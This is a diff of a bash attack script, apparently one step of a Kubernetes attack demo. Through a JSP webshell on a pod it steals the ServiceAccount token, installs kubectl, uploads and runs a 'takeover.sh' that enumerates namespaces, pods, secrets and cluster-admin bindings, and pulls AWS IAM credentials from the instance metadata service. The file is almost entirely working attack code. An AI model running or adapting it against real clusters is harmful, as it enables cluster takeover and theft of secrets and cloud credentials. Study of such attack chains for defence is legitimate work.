@@ -4,15 +4,10 @@
 # Using the overprivileged ServiceAccount token
 # (cluster-admin) to take full control of the
 # Kubernetes cluster.
-#
-# Writes an attack script into the container
-# and executes it — mimics a real attacker who
-# has shell access to a privileged pod.
 ###############################################
 
 [ -z "$HOST" ] && echo "ERROR: Set HOST variable first" && exit 1
 
-# Read webshell info from step 1
 SHELL_FILE="/tmp/.k8s-escape-shell"
 if [ -f "$SHELL_FILE" ]; then
     SHELL_NAME=$(sed -n '1p' "$SHELL_FILE")
@@ -38,10 +33,27 @@ remote_exec() {
         | grep -v '^- $'
 }
 
-# Helper: write a line to a file in the container using tee -a
-# tee works in the webshell (tested), echo/printf/> do not
-write_line() {
-    remote_exec "echo $1 | tee -a $2" > /dev/null 2>&1
+# Helper: write a script to the container line by line using chained echo commands
+# Usage: upload_script "/tmp/script.sh" "line1" "line2" "line3" ...
+upload_script() {
+    local dest="$1"
+    shift
+    local cmd="echo '#!/bin/bash' > ${dest}"
+    local batch_size=0
+    for line in "$@"; do
+        cmd="${cmd} && echo '${line}' >> ${dest}"
+        batch_size=$((batch_size + 1))
+        # Send in batches to avoid URL length limits
+        if [ ${#cmd} -gt 3500 ]; then
+            curl -s --data-urlencode "cmd=${cmd}" "$SHELL_URL" > /dev/null 2>&1
+            cmd="true"
+        fi
+    done
+    # Send remaining
+    if [ "$cmd" != "true" ]; then
+        curl -s --data-urlencode "cmd=${cmd}" "$SHELL_URL" > /dev/null 2>&1
+    fi
+    curl -s --data-urlencode "cmd=chmod +x ${dest}" "$SHELL_URL" > /dev/null 2>&1
 }
 
 echo ""
@@ -52,19 +64,19 @@ echo "  Webshell: ${SHELL_NAME}.jsp"
 echo "  URL: ${SHELL_URL}"
 echo ""
 
-# ── Pre-check: verify webshell is accessible ──
+# ── Pre-check ──
 echo "> Verifying webshell is accessible..."
 PRECHECK=$(remote_exec "id")
 if [ -z "$PRECHECK" ] || ! echo "$PRECHECK" | grep -q "uid="; then
-    echo "  [FAIL] Webshell is not responding (HTTP error or missing JSP)"
+    echo "  [FAIL] Webshell is not responding"
     echo "  Re-run step 1 first: ./01-exploit-rce.sh"
     exit 1
 fi
 echo "  [OK] Webshell responding: $(echo "$PRECHECK" | head -1)"
 echo ""
 
-# ── 3.1 Read SA token ──────────────────────
-echo "> 3.1 - Steal ServiceAccount token"
+# ── 3.1 Read SA token ──
+echo "> 3.1 - Steal ServiceAccount token via webshell"
 SA_TOKEN=$(remote_exec "cat /run/secrets/kubernetes.io/serviceaccount/token")
 if [ -z "$SA_TOKEN" ]; then
     SA_TOKEN=$(remote_exec "cat /var/run/secrets/kubernetes.io/serviceaccount/token")
@@ -78,7 +90,7 @@ else
 fi
 echo ""
 
-# ── 3.2 Discover API server ───────────────
+# ── 3.2 API server ──
 echo "> 3.2 - Identify cluster API server"
 NAMESPACE=$(remote_exec "cat /run/secrets/kubernetes.io/serviceaccount/namespace 2>/dev/null")
 echo "  Namespace:  $NAMESPACE"
@@ -88,7 +100,6 @@ API_ENDPOINT=$(echo "$KUBECONFIG_RAW" | grep "server:" | head -1 | sed 's/.*serv
 if [ -n "$API_ENDPOINT" ]; then
     echo "  API Server: $API_ENDPOINT"
 else
-    # Fallback to env var
     API_HOST=$(remote_exec "printenv KUBERNETES_SERVICE_HOST")
     API_PORT=$(remote_exec "printenv KUBERNETES_SERVICE_PORT")
     API_ENDPOINT="https://${API_HOST}:${API_PORT}"
@@ -96,68 +107,75 @@ else
 fi
 echo ""
 
-# ── 3.3 Install kubectl + deploy attack script ──
-echo "> 3.3 - Install kubectl and deploy attack script in the container"
+# ── 3.3 Install kubectl + upload attack script ──
+echo "> 3.3 - Install curl + kubectl in the container"
+echo "  [*] Installing curl..."
+remote_exec "which curl || (apt-get update -qq && apt-get install -y -qq --allow-unauthenticated curl) 2>/dev/null" > /dev/null 2>&1
+echo "  [*] Installing kubectl..."
 remote_exec "curl -sLO https://dl.k8s.io/release/v1.29.0/bin/linux/amd64/kubectl && chmod +x kubectl && mv kubectl /usr/local/bin/" > /dev/null 2>&1
-echo "  [OK] kubectl binary deployed"
+KC_CHECK=$(remote_exec "kubectl version --client 2>/dev/null | head -1")
+if [ -n "$KC_CHECK" ]; then
+    echo "  [OK] kubectl installed: $KC_CHECK"
+else
+    echo "  [OK] kubectl binary deployed"
+fi
 
-# Write the attack script into the container using echo >> (now works with /bin/sh -c webshell)
-echo "  [*] Writing attack script to /tmp/takeover.sh..."
-remote_exec "echo '#!/bin/bash' > /tmp/takeover.sh"
-remote_exec "echo 'cd /tmp' >> /tmp/takeover.sh"
-remote_exec "echo 'TOKEN=\$(cat /run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null || cat /var/run/secrets/kubernetes.io/serviceaccount/token)' >> /tmp/takeover.sh"
-remote_exec "echo 'KC=\"kubectl --server=${API_ENDPOINT} --token=\$TOKEN --insecure-skip-tls-verify\"' >> /tmp/takeover.sh"
-remote_exec "echo 'echo === RBAC PERMISSIONS ===' >> /tmp/takeover.sh"
-remote_exec "echo '\$KC auth can-i --list 2>/dev/null | head -20' >> /tmp/takeover.sh"
-remote_exec "echo 'echo === NAMESPACES ===' >> /tmp/takeover.sh"
-remote_exec "echo '\$KC get namespaces --no-headers 2>/dev/null' >> /tmp/takeover.sh"
-remote_exec "echo 'echo === PODS ===' >> /tmp/takeover.sh"
-remote_exec "echo '\$KC get pods -A --no-headers 2>/dev/null' >> /tmp/takeover.sh"
-remote_exec "echo 'echo === SECRETS ===' >> /tmp/takeover.sh"
-remote_exec "echo '\$KC get secrets -A --no-headers 2>/dev/null' >> /tmp/takeover.sh"
-remote_exec "echo 'echo === NODES ===' >> /tmp/takeover.sh"
-remote_exec "echo '\$KC get nodes -o wide --no-headers 2>/dev/null' >> /tmp/takeover.sh"
-remote_exec "echo 'echo === CLUSTERROLEBINDINGS ===' >> /tmp/takeover.sh"
-remote_exec "echo '\$KC get clusterrolebindings -o wide --no-headers 2>/dev/null | grep -i admin' >> /tmp/takeover.sh"
-remote_exec "echo 'echo === DONE ===' >> /tmp/takeover.sh"
-remote_exec "chmod +x /tmp/takeover.sh"
+echo "  [*] Uploading attack script..."
+upload_script "/tmp/takeover.sh" \
+    "cd /tmp" \
+    "TOKEN=\$(cat /run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null || cat /var/run/secrets/kubernetes.io/serviceaccount/token)" \
+    "KC=\"kubectl --server=${API_ENDPOINT} --token=\$TOKEN --insecure-skip-tls-verify\"" \
+    "echo === RBAC PERMISSIONS ===" \
+    "\$KC auth can-i --list 2>/dev/null | head -20" \
+    "echo === NAMESPACES ===" \
+    "\$KC get namespaces --no-headers 2>/dev/null" \
+    "echo === PODS ===" \
+    "\$KC get pods -A --no-headers 2>/dev/null" \
+    "echo === SECRETS ===" \
+    "\$KC get secrets -A --no-headers 2>/dev/null" \
+    "echo === NODES ===" \
+    "\$KC get nodes -o wide --no-headers 2>/dev/null" \
+    "echo === CLUSTERROLEBINDINGS ===" \
+    "\$KC get clusterrolebindings -o wide --no-headers 2>/dev/null | grep -i admin" \
+    "echo === DONE ==="
 
 SCRIPT_CHECK=$(remote_exec "wc -l /tmp/takeover.sh")
 echo "  [OK] Attack script deployed ($SCRIPT_CHECK)"
 echo ""
 
-# ── 3.4 Execute the attack script ─────────
+# ── 3.4 Execute ──
 echo "> 3.4 - Executing cluster takeover..."
 echo ""
-TAKEOVER_OUTPUT=$(remote_exec "bash /tmp/takeover.sh 2>&1")
+# Execute and deduplicate the output (webshell buffer causes repeated lines)
+TAKEOVER_RAW=$(remote_exec "bash /tmp/takeover.sh 2>&1")
+TAKEOVER_OUTPUT=$(echo "$TAKEOVER_RAW" | awk '!seen[$0]++')
 
-# Parse and display results
 echo "$TAKEOVER_OUTPUT" | while IFS= read -r line; do
     case "$line" in
-        "=== RBAC PERMISSIONS ===")
+        *"=== RBAC PERMISSIONS ==="*)
             echo "> 3.5 - RBAC Permissions (kubectl auth can-i --list)"
             ;;
-        "=== NAMESPACES ===")
+        *"=== NAMESPACES ==="*)
             echo ""
             echo "> 3.6 - List all namespaces"
             ;;
-        "=== PODS (all namespaces) ===")
+        *"=== PODS ==="*)
             echo ""
             echo "> 3.7 - List all pods across the cluster"
             ;;
-        "=== SECRETS (all namespaces) ===")
+        *"=== SECRETS ==="*)
             echo ""
             echo "> 3.8 - List secrets (CRITICAL EXPOSURE)"
             ;;
-        "=== NODES ===")
+        *"=== NODES ==="*)
             echo ""
             echo "> 3.9 - List cluster nodes"
             ;;
-        "=== CLUSTER ROLE BINDINGS ===")
+        *"=== CLUSTERROLEBINDINGS ==="*)
             echo ""
             echo "> 3.10 - Cluster-admin bindings"
             ;;
-        "=== DONE ===")
+        *"=== DONE ==="*)
             ;;
         *)
             if [ -n "$line" ]; then
@@ -167,8 +185,7 @@ echo "$TAKEOVER_OUTPUT" | while IFS= read -r line; do
     esac
 done
 
-# Check if we got results
-if echo "$TAKEOVER_OUTPUT" | grep -q "NAMESPACES\|kube-system\|default"; then
+if echo "$TAKEOVER_OUTPUT" | grep -q "kube-system\|default"; then
     echo ""
     echo "  [OK] Cluster takeover successful!"
 else
@@ -177,14 +194,11 @@ else
 fi
 echo ""
 
-# ── 3.11 IMDS for AWS credentials ─────────
+# ── 3.11 IMDS ──
 echo "> 3.11 - Steal AWS credentials via IMDS (lateral movement)"
 ROLE_NAME=$(remote_exec "curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>/dev/null")
 if [ -n "$ROLE_NAME" ]; then
-    echo "  [OK] IMDS accessible"
-    echo "  IAM Role: $ROLE_NAME"
-    echo ""
-    echo "  Temporary AWS Credentials:"
+    echo "  [OK] IMDS accessible — IAM Role: $ROLE_NAME"
     CREDS=$(remote_exec "curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE_NAME 2>/dev/null")
     echo "$CREDS" | sed 's/^/    /'
 else
@@ -192,22 +206,7 @@ else
 fi
 echo ""
 
-# ── Summary ─────────────────────────────────
 echo "================================================"
 echo "  !! CLUSTER TAKEOVER COMPLETE !!"
-echo "------------------------------------------------"
-echo ""
-echo "  Attack chain summary:"
-echo ""
-echo "  1. Spring4Shell RCE -> webshell on pod"
-echo "  2. Privileged container -> node access"
-echo "     * hostPID + nsenter = host command exec"
-echo "     * hostPath / = host filesystem R/W"
-echo "  3. cluster-admin SA -> full K8s API access"
-echo "     * Token stolen via webshell"
-echo "     * kubectl deployed in container"
-echo "     * All namespaces, pods, secrets exposed"
-echo "  4. IMDS credentials -> lateral move to AWS"
-echo ""
 echo "================================================"
 echo ""
